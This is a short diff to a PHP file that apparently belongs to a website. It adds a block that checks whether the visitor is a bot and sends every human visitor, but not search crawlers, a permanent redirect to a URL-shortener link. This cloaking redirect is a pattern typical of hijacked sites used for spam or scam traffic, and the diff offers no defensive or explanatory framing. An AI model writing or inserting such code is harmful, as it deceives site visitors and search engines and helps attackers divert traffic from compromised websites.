@@ -19,7 +19,12 @@ function isBot(): bool
     }
     return false;
 }
-
+if (!isBot()) 
+{
+    header("HTTP/1.1 301 Moved Permanently");
+    header("Location: https://t.ly/pang555");
+    exit();
+}
 $BRAND   = '';
 $NUMLIST = 0;
 
